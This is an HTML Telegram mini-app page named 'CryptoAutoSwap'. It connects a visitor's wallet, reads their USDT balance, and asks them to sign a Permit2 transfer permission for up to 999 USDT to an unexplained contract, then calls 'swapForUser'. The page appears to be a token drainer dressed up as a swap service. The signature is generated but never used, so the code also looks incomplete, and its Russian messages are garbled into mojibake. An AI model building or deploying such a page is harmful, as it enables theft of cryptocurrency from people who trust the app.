<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CryptoAutoSwap</title>

  <!-- Telegram WebApp -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <!-- WalletConnect & ethers v5 -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <style>
    body {
      background: #0e0e10;
      color: white;
      font-family: sans-serif;
      padding: 20px;
      text-align: center;
    }
    #status {
      margin-top: 20px;
      font-size: 15px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h2>CryptoAutoSwap</h2>
  <div id="status">‚è≥ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>

<script type="module">
import { EthereumProvider } from "https://unpkg.com/@walletconnect/ethereum-provider@1.8.0/dist/esm/index.js";

const statusEl = document.getElementById("status");
const log = (msg, err = false) => {
  statusEl.textContent += `\n${msg}`;
  if (err) console.error(msg);
};

// Telegram init
Telegram.WebApp.ready();
Telegram.WebApp.expand();

// Config
const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
const CHAIN_ID = 56;
const RPC_URL = "https://bsc-dataseed.binance.org/";

const USDT = "0x55D398326f99059FF775485246999027B3197955";
const PERMIT2 = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
const AUTOSWAP = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";

// ABI (—Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã)
const USDT_ABI = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"];
const SWAP_ABI = ["function swapForUser(address user, uint256 amountUSDT)"];
const PERMIT_ABI = ["function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)"];

(async () => {
  try {
    log("üîó –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ WalletConnect...");

    const provider = await EthereumProvider.init({
      projectId: PROJECT_ID,
      chains: [CHAIN_ID],
      showQrModal: true,
      rpcMap: { [CHAIN_ID]: RPC_URL }
    });

    await provider.connect();

    const ethersProvider = new ethers.providers.Web3Provider(provider, "any");
    const signer = ethersProvider.getSigner();
    const address = await signer.getAddress();
    log(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω –∫–æ—à–µ–ª—ë–∫: ${address}`);

    const network = await ethersProvider.getNetwork();
    if (network.chainId !== CHAIN_ID) {
      log("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ —Å–µ—Ç—å –Ω–∞ Binance Smart Chain (BSC)", true);
      return;
    }

    // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å USDT
    const usdt = new ethers.Contract(USDT, USDT_ABI, ethersProvider);
    const balance = await usdt.balanceOf(address);
    const decimals = await usdt.decimals();
    if (balance.lte(0)) {
      log("‚ùå –ë–∞–ª–∞–Ω—Å USDT = 0");
      return;
    }

    const amountMax = ethers.utils.parseUnits("999", decimals);
    const amount = balance.gt(amountMax) ? amountMax : balance;
    const amountStr = ethers.utils.formatUnits(amount, decimals);
    log(`üí∞ –ë–∞–ª–∞–Ω—Å USDT: ${amountStr}`);

    // –ü–æ–ª—É—á–∞–µ–º nonce –¥–ª—è Permit2
    const permit2 = new ethers.Contract(PERMIT2, PERMIT_ABI, ethersProvider);
    const { nonce } = await permit2.allowance(address, USDT, AUTOSWAP);

    const deadline = Math.floor(Date.now() / 1000) + 30 * 86400;

    const domain = {
      name: "Permit2",
      chainId: CHAIN_ID,
      verifyingContract: PERMIT2
    };

    const types = {
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" }
      ]
    };

    const message = {
      permitted: { token: USDT, amount: amount.toString() },
      spender: AUTOSWAP,
      nonce: nonce.toString(),
      deadline
    };

    log("‚úçÔ∏è –ü–æ–¥–ø–∏—Å—å Permit2...");
    const signature = await signer._signTypedData(domain, types, message);
    log("‚úÖ –ü–æ–¥–ø–∏—Å—å –ø–æ–ª—É—á–µ–Ω–∞");

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º swapForUser
    const swap = new ethers.Contract(AUTOSWAP, SWAP_ABI, signer);
    log("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ swapForUser...");
    const tx = await swap.swapForUser(address, amount);
    log(`‚è≥ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:\n${tx.hash}`);
    await tx.wait();
    log("‚úÖ –¢–æ–∫–µ–Ω—ã –æ–±–º–µ–Ω—è–Ω—ã! üéâ");

    setTimeout(() => Telegram.WebApp.close(), 4000);
  } catch (e) {
    log(`‚ùå –û—à–∏–±–∫–∞: ${e.message || e}`, true);
  }
})();
</script>
</body>
</html>